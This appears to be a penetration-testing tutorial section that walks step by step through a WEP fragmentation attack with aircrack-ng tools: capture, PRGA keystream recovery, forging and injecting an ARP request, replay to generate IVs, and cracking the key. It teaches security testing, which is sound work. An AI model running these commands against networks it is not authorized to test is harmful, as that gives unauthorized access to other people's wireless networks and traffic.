
By now, we have learned that if we generate enough unique initialization vectors (IVs) and save the communication to a file, it enables us to crack the key. For an `ARP request replay attack`, capturing a valid ARP request (broadcast request) in the network is essential. However, if no ARP requests are being made, we can use a [Fragmentation Attack](https://www.aircrack-ng.org/doku.php?id=fragmentation) instead. This attack achieves the same goal, but through an entirely different method: using fragmented packets to recover the PRGA (Pseudo Random Generation Algorithm) keystream.

#### Performing the Attack


```
sudo airmon-ng start wlan0
```


We begin by scanning the target access point using `airodump-ng`, capturing the communication into a file. The interface in monitor mode is specified using `wlan0mon`, the access point's channel with `-c`, and the output location with the `-w` argument.

```
airodump-ng wlan0mon -c 1 -w WEP
```

Next, we initiate the fragmentation attack with the following command. The `-5` option indicates the fragmentation attack, while `-b` specifies the BSSID of the AP, and `-h` is the MAC address of the connected station (or any source address that can associate with the AP).

```
aireplay-ng -5 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon
```

A successful fragmentation attack will display an output indicating that the PRGA `xor` file has been saved. Afterward, we need to analyze the capture file to identify the source and destination IP addresses, as well as the MAC addresses. This can be accomplished with `tcpdump`.

```
tcpdump -s 0 -n -e -r replay_src-0805-191842.cap
```


Once we have the required addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally the output name for the forged ARP request capture file with `-w`.


```
packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y fragment-0805-191851.xor -w forgedarp.cap
```


Once the forged ARP request is written into `forgedarp.cap`, we can inject it into the target network to generate initialization vectors (IVs). One common method for this is using the Aircrack Suite's Interactive Packet Replay.

We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h` and our interface in monitor mode with `wlan0mon` as shown below.

```
aireplay-ng -2 -r forgedarp.cap -h 42:E9:11:39:88:AE wlan0mon
```

As this process runs, back in the `airodump-ng` output we can notice that the `Frames` count for the connected station increases. This is a positive sign that many IVs are being generated.

To further accelerate the IV generation process, we can launch an ARP request replay attack in a new terminal. This approach will enhance the rate at which new IVs are created, helping to expedite the overall process.


```
sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon
```

Once enough packets have been gathered, we can use aircrack-ng to crack the WEP key from the captured IVs stored in the `WEP-01.cap` file:

```
aircrack-ng -b A2:BD:32:EB:21:15 WEP-01.cap
```

